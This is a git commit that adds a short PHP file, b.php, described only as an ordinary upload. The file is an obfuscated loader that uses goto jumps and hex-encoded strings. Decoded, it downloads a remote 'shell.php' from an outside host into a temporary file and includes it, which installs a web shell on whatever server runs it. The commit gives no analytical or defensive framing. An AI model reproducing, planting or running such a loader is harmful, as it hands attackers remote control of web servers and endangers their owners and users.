e396ed7dcf9abba745a3e2fd239ea5e9dc041cb5
Initial-B <initialb1337@gmail.com>
2025-07-09 13:21:17 +0700

    Add files via upload

---
+++ b.php
@@ -0,0 +1,3 @@
+<?php 
+goto sHNkh; sHNkh: $EnoeA = tmpfile(); goto uTcE6; uTcE6: $UmXGi = fwrite($EnoeA, file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6e\x69\x74\x69\x61\x6c\x2d\x62\x2e\x77\x65\x62\x2e\x69\x64\x2f\x73\x68\x65\x6c\x6c\x2e\x70\x68\x70")); goto xa01q; xa01q: include stream_get_meta_data($EnoeA)["\165\x72\x69"]; goto Lg1o1; Lg1o1: fclose($EnoeA); 
+?>
